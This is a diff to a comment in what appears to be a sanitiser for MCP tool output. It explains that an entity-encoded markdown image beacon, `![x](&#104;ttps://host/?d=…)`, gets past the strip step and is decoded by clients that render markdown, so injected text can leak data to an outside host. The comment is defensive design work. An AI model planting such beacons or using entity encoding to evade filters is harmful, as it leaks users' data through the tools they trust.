@@ -213,8 +213,16 @@ function tag<T extends object>(result: T): T {
  * `decodeEntities: false` for the same reason the header channel passes it
  * (`LESSONS.md` RC-3): the decode's output is what gets RETURNED, so on a
  * channel whose consumer does not itself decode, it manufactures live markup
- * from inert bytes the tool meant literally. What it costs is stated in
- * invariant 1a — Step 5 cannot unmask an entity-encoded injection phrase here.
+ * from inert bytes the tool meant literally.
+ *
+ * **What that costs here is larger than on the header channel, and it is not
+ * only a logging blindness.** An entity-encoded beacon —
+ * `![x](&#104;ttps://host/?d=…)` — SURVIVES THE STRIP and is returned intact,
+ * and an MCP client that renders this text as markdown decodes entity
+ * references in link destinations. The two channels want opposite things from
+ * one stage and no per-caller flag setting is right for both: `LESSONS.md`
+ * RC-12, open design question in `docs/todos/004`, cost restated in
+ * ARCHITECTURE.md invariant 1a.
  */
 function processTextPart(
     part: unknown,
